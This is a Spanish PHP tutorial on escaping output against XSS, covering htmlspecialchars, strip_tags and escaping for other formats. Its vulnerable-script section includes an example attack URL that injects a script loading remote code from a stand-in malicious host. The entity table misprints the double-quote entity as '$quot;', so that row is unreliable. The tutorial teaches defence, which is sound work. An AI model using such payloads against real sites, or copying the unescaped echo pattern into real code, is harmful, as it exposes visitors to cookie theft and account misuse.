**Indice de contenido**

1.  Introducción
2.  Ejemplo de script vulnerable
3.  Escape básico de HTML
4.  Otras formas de escapar output

### 1. Introducción

La mayoría de aplicaciones producen _**output**_ de algún tipo, ya sea en formato **HTML**, un archivo **XML** o un **JSON** feed, y para cualquier formato de output los datos de salida han de ser escapados. 

Para entender el output escaping es necesario saber cómo funciona **HTML**, **HiperText Markup Languaje**. Un archivo HTML contiene **contenido** y **comandos**, ya que es un **lenguaje de marcado**. Los **comandos** marcan las **secciones del contenido** (cabeceras, scripts, negritas...) o insertan caracteres especiales, imágenes o scripts. Para separar el contenido y los comandos, HTML reserva los caracteres <, > y &. Las etiquetas HTML están envueltas con los caracteres < y >, por lo que no se pueden usar para nada más.

Si quieres usar cualquiera de esos caracteres reservados, se han de emplear **entidades HTML**, que son **comandos que insertan caracteres especiales**:

| | | |
| -------- | -------- |
| **Carácter** | **Nombre de entidad** | **Código de entidad** |
| < | Less Than | &lt; |
| > | Greater Than | &gt; |
| & | Ampersand | &amp; |
| " | Double Quote | $quot; |

Existen alrededor de 250 caracteres reservados, pero si se utiliza una [codificación UTF-8](http://diego.com.es/codificacion-de-caracteres-en-programacion), estos serán los únicos que realmente se van a necesitar. Si se quiere insertar en HTML cualquiera de los caracteres anteriores desde PHP, habrá que convertirlos en entidades HTML para evitar que haya errores. Los ataques que se pueden hacer a raíz de caracteres no escapados se denominan ataques [XSS Cross-Site Scripting](http://diego.com.es/ataques-xss-cross-site-scripting-en-php).

### 2. Ejemplo de script vulnerable

Este es un ejemplo de un script muy vulnerable:

```
$nombre = $_GET['nombre'];
echo "hola $nombre";
```

Dos razones básicas: el _**input**_ no está **filtrado** y el _**input**_ no se ha **escapado**. Esto deriva en la posibilidad de que alguien pueda insertar un script en la URL y enviarla a alguien: _http://example.com/tuscript.php?nombre=<script src="http://veneno.com/veneno.js"></script>_. Si alguien hace click en el enlace el script remoto arranca desde tu página en el navegador del visitante. El script puede robar cookies, usar la cuenta del usuario (esto se denominaría [ataque CSRF](http://diego.com.es/ataques-csrf-cross-site-request-forgery-en-php)), etc. 

### 3. Escape básico de HTML

Lo primero que hay que hacer siempre es filtrar el input. En el script anterior, el nombre no necesita ninguna etiqueta HTML, por lo que puede emplearse el filtro **FILTER_SANITIZE_STRING**, que **eliminará cualquier etiqueta HTML y PHP**. La segunda acción a realizar es **escapar el _output_** con _**htmlspecialchars()**_:

```
$nombre = filter_input(INPUT_GET, 'nombre', FILTER_SANITIZE_STRING);
echo "hola " . htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8');
```

La función _htmlentities()_ protege de un mayor número de caracteres, pero si se usa HTML o XML con una codificación UTF-8 no es necesario emplear esta función. Por ello, el HTML siempre ha de ser UTF-8 y en la función _htmlspecialchars()_ se ha de especificar esto también como tercer argumento. _**htmlspecialchars()**_ traduce los siguientes caracteres: &, < y >, y opcionalmente " y '.

*  htmlspecialchars
```
string htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get("default_charset") [, bool **$double_encode = true ]]] )
```

El segundo argumento es una **bandera** que permite especificar las necesidades de conversión. En este caso se ha indicado **ENT_QUOTES**, que convertirá tanto las **comillas simples '** como las **comillas dobles "**. Pueden verse todas las banderás [aquí](http://php.net/manual/en/function.htmlspecialchars.php).

Es posible poder **escapar las variables cuando se cargan**, es decir:

```
$nombre = htmlspecialchars(filter_input(INPUT_GET, 'nombre'), ENT_QUOTES, 'UTF-8');

```

Pero es una **forma incorrecta de hacerlo**. Hay que escapar cuando se va a **mostrar el contenido**, nunca antes. Si después se quiere **exportar el contenido a CSV** por ejemplo, necesita un tipo de escape diferente, y mostraría cosas como **&lt;** en las celdas de las tablas.

La **función _strip_tags_** permite **eliminar etiquetas HTML y PHP de un string**:

*  strip_tags
```
_string_ **strip_tags (** _string_ **$str [,** _string_ **$allowable_tags ] )**
```

Lo que hace esta función es devolver un string con las **etiquetas HTML** y **PHP** y los **bytes null** eliminados. Se pueden añadir etiquetas que se quieren permitir y no eliminar:

```
$texto = '<p>Esto es un texto</p><br />
<strong>Yo soy negrita</strong><br />
<!-- Comentario -->
<a href="#fragmento">Un enlace</a>';
echo strip_tags($texto, '<strong><br>');
/*
Devuelve:
Esto es un texto
Yo soy negrita // (en negrita)
Un enlace
*/
```

### 4. Escapar otros formatos desde PHP

*   **XML**, con **librerías XML**, como **SimpleXML**. Escapar dos veces no es conveniente (aunque sería mejor que no escapar nada).
*   **Javascript**, PHP no tiene un método incorporado para escapar JS, pero se puede utilizar _json_encode()_ (junto con _htmlspecialchars()_ si se quiere mostrar en HTML).
*   **SQL**, se puede escapar, pero es mejor utilizar parameterized queries.
*   **Líneas de comandos**, mediante la función _escapeshellarg()_.
*   **Mail**, lo mejor es usar una extensión tipo **SwiftMailer** para prevenir [ataques Email Injection](http://diego.com.es/ataques-email-injection-en-php).

Para **mostrar HTML** existen **frameworks** que permiten reducir mucho trabajo a la hora de **escapar caracteres**, **herencia de plantillas**, un **código más limpio**... Una de las más potentes es [Twig](http://twig.sensiolabs.org/).